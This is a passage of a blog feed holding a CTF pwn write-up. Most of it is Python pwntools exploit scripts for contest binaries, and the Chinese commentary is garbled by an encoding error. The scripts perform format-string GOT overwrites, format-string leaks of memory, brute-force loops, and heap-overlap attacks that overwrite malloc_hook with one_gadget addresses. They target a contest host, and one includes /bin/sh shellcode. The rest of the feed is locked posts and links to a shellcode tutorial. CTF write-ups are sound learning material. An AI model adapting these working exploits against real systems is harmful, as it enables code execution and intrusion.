class="comment"># canary=ru("May Be One More Time\n")</span></span><br><span class="line"><span class="comment"># leak("canary",int(canary[1:],16))</span></span><br><span class="line"><span class="comment"># canary=int(canary[1:],16)</span></span><br><span class="line"><span class="comment"># pld=b"A"*(0x28)+p32(canary)+"A"*0xc+p32(bin_sh)</span></span><br><span class="line"><span class="comment"># #pld=pld.ljust(0x34+0x4,'A')+p32(bin_sh)*0xc+p32(bin_sh)</span></span><br><span class="line"><span class="comment"># sl(pld)</span></span><br><span class="line"><span class="comment"># itr()</span></span><br><span class="line">__stack_chk_fail = elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">payload = fmtstr_payload(<span class="number">5</span>,&#123;__stack_chk_fail:bin_sh&#125;)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">'A'</span>)</span><br><span class="line">ru(<span class="string">"?"</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">"May Be One More Time\n"</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>ÂóØÁàÜÁ†¥Â∞±Ë°å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"><span class="comment">#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"><span class="comment">#p=remote('219.219.61.234',10002)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    p =remote(<span class="string">"219.219.61.234"</span>,<span class="number">10002</span>)</span><br><span class="line">    ru(<span class="string">":"</span>)</span><br><span class="line">    sl(<span class="string">"\x00\x00"</span>)</span><br><span class="line">    flag=r()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"&#123;"</span> <span class="keyword">in</span> flag:</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure><h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p>Áõ¥Êé•Ê≥ÑÈú≤flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"><span class="comment">#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="comment">#p = process(".")</span></span><br><span class="line">p = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10003</span>)</span><br><span class="line">ru(<span class="string">":"</span>)</span><br><span class="line">sl(<span class="string">"%26$p"</span>)</span><br><span class="line">ru(<span class="string">":"</span>)</span><br><span class="line">f=r(<span class="number">6</span>)[<span class="number">2</span>:]</span><br><span class="line">flag+=binascii.a2b_hex(f)[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>,<span class="number">32</span>):</span><br><span class="line">p = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10003</span>)</span><br><span class="line">ru(<span class="string">":"</span>)</span><br><span class="line">sl(<span class="string">"%&#123;&#125;$p"</span>.format(i))</span><br><span class="line">ru(<span class="string">":"</span>)</span><br><span class="line">f=r(<span class="number">18</span>)[<span class="number">2</span>:]</span><br><span class="line">flag += binascii.a2b_hex(f)[::<span class="number">-1</span>]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h3><p>ÁªèÂÖ∏pwnÈ¢òÔºåsizeÊòØ‰ªªÊÑèÁöÑÔºå‰∏îËøô‰∏™ÊòØÂú®16‰∏äÁöÑ</p><ol><li>ÂÖàÊ≥ÑÈú≤libcÔºåÂêëÂêéÂêàÂπ∂ÔºåÂú®ÂàÜÈÖçÔºåÁõ¥Êé•ÊãøÂà∞libc</li><li>ÁÑ∂ÂêéÂ∞±ÊòØÁªèÂÖ∏ÁöÑmalloc_hookÂíårealloc_hookÁõ∏ÁªìÂêà,ÂÜôone_gadget</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">p = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10005</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn6")</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#elf = ELF("./pwn2")</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    sla(<span class="string">'Your choice :\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">    sla(<span class="string">'Size:'</span>, str(size))</span><br><span class="line">    sa(<span class="string">'Data:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">'Your choice :\n'</span>, <span class="string">'2'</span>)</span><br><span class="line">    sla(<span class="string">'Index:'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">'Your choice :\n'</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'A'</span>*<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'B'</span>*<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">'C'</span>*<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">'D'</span>*<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'E'</span>*(<span class="number">0x100</span> - <span class="number">0x10</span>) + p64(<span class="number">0x100</span>) + p64(<span class="number">0x11</span>))<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'F'</span> * <span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x300</span>)</span><br><span class="line">create(<span class="number">0x68</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc_hook_sym = libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc_sym = libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xcd173</span>,<span class="number">0xcd248</span>,<span class="number">0xf0364</span>,<span class="number">0xf0370</span>,<span class="number">0xf1207</span>,<span class="number">0xf67b0</span>]</span><br><span class="line"></span><br><span class="line">one=gadget[<span class="number">1</span>]</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'A'</span> * <span class="number">0x100</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'1 : '</span>)</span><br><span class="line"></span><br><span class="line">main_arena = uu64(ru(<span class="string">' '</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="comment">#malloc_hook = (main_area &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_sym &amp; 0xFFF)</span></span><br><span class="line"><span class="comment">#libc_base = malloc_hook - malloc_hook_sym</span></span><br><span class="line">malloc_hook = libc_base + malloc_hook_sym</span><br><span class="line">leak(<span class="string">"libc"</span>,libc_base)</span><br><span class="line">realloc_hook = libc_base + realloc_sym</span><br><span class="line">gadget = libc_base + one</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'G'</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">create(<span class="number">0x118</span>, payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">'H'</span> * <span class="number">0x68</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span> * (<span class="number">0x13</span><span class="number">-0x8</span>) + p64(gadget) + p64(realloc_hook) + <span class="string">'\n'</span></span><br><span class="line">create(<span class="number">0x68</span>, payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">'Your choice :\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">sla(<span class="string">'Size:'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h3 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h3><p>dasctfÊîπÁºñÈ¢òÔºåÁ¨¨‰∏ÄÊ¨°ÂæóÂÖàÊ≥ÑÈú≤libcÔºåÂΩìÁî≥ËØ∑sizeË∂≥Â§üÂ§ßÔºåÂ∞±‰ºöÁî≥ËØ∑Âà∞Èù†ËøëlibcÁöÑÂú∞Êñπ</p><p>‰πãÂêéÂ∞±ÊòØÊääone_gadgetÂÜôÂÖ•malloc_hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./pwn3")</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">onegadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xcd173</span>,<span class="number">0xcd248</span>,<span class="number">0xf03a4</span>,<span class="number">0xf03b0</span>,<span class="number">0xf1247</span>,<span class="number">0xf67f0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10004</span>)</span><br><span class="line">        libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line">        ru(<span class="string">"size."</span>,drop=<span class="literal">True</span>)</span><br><span class="line">        sl(str(<span class="number">0x300000</span>))</span><br><span class="line">        <span class="comment">#gdb.attach(p)</span></span><br><span class="line">        offset = <span class="number">3149808</span></span><br><span class="line">        ru(<span class="string">"0x"</span>,drop=<span class="literal">True</span>)</span><br><span class="line">        heap = int(ru(<span class="string">"\n"</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        libc_base = heap + offset</span><br><span class="line">        leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">        one = libc_base + onegadget[i]</span><br><span class="line">        malloc_hook = libc_base + libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">        ru(<span class="string">"offset."</span>)</span><br><span class="line">        shot = hex(malloc_hook - heap)[<span class="number">2</span>:]</span><br><span class="line">        <span class="comment">#gdb.attach(p)</span></span><br><span class="line">        sl(str(shot))</span><br><span class="line">        ru(<span class="string">"one_gadget."</span>,drop=<span class="literal">True</span>)</span><br><span class="line">        s(p64(one))</span><br><span class="line">        itr()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-‰∫îÊúàÊ†°Ëµõ&quot;&gt;&lt;a href=&quot;#0x01-‰∫îÊúàÊ†°Ëµõ&quot; class=&quot;headerlink&quot; title=&quot;0x01 ‰∫îÊúàÊ†°Ëµõ&quot;&gt;&lt;/a&gt;0x01 ‰∫îÊúàÊ†°Ëµõ&lt;/h1&gt;&lt;h2 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="WP" scheme="https://pz1o.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>BUU(PWN3)</title>
    <link href="https://pz1o.top/2021/06/16/BUU-PWN3/"/>
    <id>https://pz1o.top/2021/06/16/BUU-PWN3/</id>
    <published>2021-06-16T10:19:01.000Z</published>
    <updated>2021-06-16T11:22:42.511Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Â¶Ç‰ΩïÁºñÂÜôshellcode(‰∫å)</title>
    <link href="https://pz1o.top/2021/06/15/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99shellcode-%E4%BA%8C/"/>
    <id>https://pz1o.top/2021/06/15/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99shellcode-%E4%BA%8C/</id>
    <published>2021-06-15T10:31:10.000Z</published>
    <updated>2021-06-15T10:33:16.388Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Â¶Ç‰ΩïÁºñÂÜôshellcode"><a href="#Â¶Ç‰ΩïÁºñÂÜôshellcode" class="headerlink" title="Â¶Ç‰ΩïÁºñÂÜôshellcode"></a>Â¶Ç‰ΩïÁºñÂÜôshellcode</h1><p>‰∏ä‰∏ÄÁØáÊÑüËßâËÆ≤ÁöÑÂ§™ÊµÖ‰∫ÜÔºåËøôÂõûÊâæÂá†‰∏™Â§ßÂûãÊØîËµõ‰æãÈ¢òÊù•ËÆ≤„ÄÇ</p><h1 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h1><p><a href="https://xz.aliyun.com/t/2052" target="_blank" rel="noopener">Linux‰∏ãshellcodeÁöÑÁºñÂÜô - ÂÖàÁü•Á§æÂå∫ (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/5662" target="_blank" rel="noopener">ÁîüÊàêÂèØÊâìÂç∞ÁöÑshellcode - ÂÖàÁü•Á§æÂå∫ (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/6645" target="_blank" rel="noopener">shellcode ÁöÑËâ∫ÊúØ - ÂÖàÁü•Á§æÂå∫ (aliyun.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Â¶Ç‰ΩïÁºñÂÜôshellcode&quot;&gt;&lt;a href=&quot;#Â¶Ç‰ΩïÁºñÂÜôshellcode&quot; class=&quot;headerlink&quot; title=&quot;Â¶Ç‰ΩïÁºñÂÜôshellcode&quot;&gt;&lt;/a&gt;Â¶Ç‰ΩïÁºñÂÜôshellcode&lt;/h1&gt;&lt;p&gt;‰∏ä‰∏ÄÁØáÊÑüËßâËÆ≤ÁöÑÂ§™ÊµÖ‰∫ÜÔºåËøôÂõûÊâæÂá†‰∏™Â§ßÂûãÊØîËµõ‰æãÈ¢òÊù•ËÆ≤„ÄÇ&lt;</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>È´òÁ∫ßROP</title>
    <link href="https://pz1o.top/2021/06/14/%E9%AB%98%E7%BA%A7ROP/"/>
    <id>https://pz1o.top/2021/06/14/%E9%AB%98%E7%BA%A7ROP/</id>
    <published>2021-06-14T10:29:14.000Z</published>
    <updated>2021-06-18T09:57:16.497Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>tcacheÁöÑÂ•óË∑Ø</title>
    <link href="https://pz1o.top/2021/06/11/tcache%E7%9A%84%E5%A5%97%E8%B7%AF/"/>
    <id>https://pz1o.top/2021/06/11/tcache%E7%9A%84%E5%A5%97%E8%B7%AF/</id>
    <published>2021-06-11T15:14:14.000Z</published>
    <updated>2021-06-11T15:41:12.440Z</updated>
    
